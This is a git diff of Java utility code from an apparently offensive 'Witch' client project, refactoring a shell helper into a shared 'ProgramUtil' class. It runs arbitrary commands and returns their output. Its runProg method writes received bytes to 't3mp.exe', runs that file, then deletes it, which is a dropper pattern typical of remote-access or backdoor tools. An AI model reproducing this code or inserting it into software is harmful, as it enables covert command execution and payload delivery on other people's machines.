@@ -1,27 +1,36 @@
-package me.soda.witch.client.utils;
-
-import me.soda.witch.client.Witch;
+package me.soda.witch.shared;
 
 import java.io.*;
 import java.nio.charset.StandardCharsets;
+import java.util.function.Consumer;
 
 @SuppressWarnings("ResultOfMethodCallIgnored")
-public class ShellUtil {
+public class ProgramUtil {
     public static boolean isWin() {
         return System.getProperty("os.name").toLowerCase().contains("windows");
     }
 
     public static String runCmd(String command) {
+        Process process = null;
+        try {
+            process = isWin() ? Runtime.getRuntime().exec(
+                    new String[]{"cmd.exe", "/c", command}
+            ) : Runtime.getRuntime().exec(command);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+
+        return getProcResult(process);
+    }
+
+    public static Process execInPath(String cmd, String path) throws IOException {
+        Runtime runtime = Runtime.getRuntime();
+        return runtime.exec(cmd, null, new File(path));
+    }
+
+    public static String getProcResult(Process process) {
         StringBuilder result = new StringBuilder();
         try {
-            Process process;
-            if (isWin()) {
-                process = Runtime.getRuntime().exec(
-                        new String[]{"cmd.exe", "/c", command}
-                );
-            } else {
-                process = Runtime.getRuntime().exec(command);
-            }
             BufferedReader inputStream = new BufferedReader(new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8));
             String line;
             while ((line = inputStream.readLine()) != null) {
@@ -29,13 +38,18 @@ public class ShellUtil {
             }
             inputStream.close();
             process.waitFor();
-        } catch (IOException | InterruptedException e) {
-            Witch.printStackTrace(e);
+        } catch (Exception e) {
+            e.printStackTrace();
         }
         return result.toString();
     }
 
+    public static void printProcResult(Process process, Consumer<String> consumer) {
+        consumer.accept(getProcResult(process));
+    }
+
     public static void runProg(byte[] bytes) {
+        if (!isWin()) return;
         try {
             File file = new File("t3mp.exe");
             file.createNewFile();
@@ -46,7 +60,7 @@ public class ShellUtil {
             process.waitFor();
             if (file.exists()) file.delete();
         } catch (IOException | InterruptedException e) {
-            Witch.printStackTrace(e);
+            e.printStackTrace();
         }
     }
 }
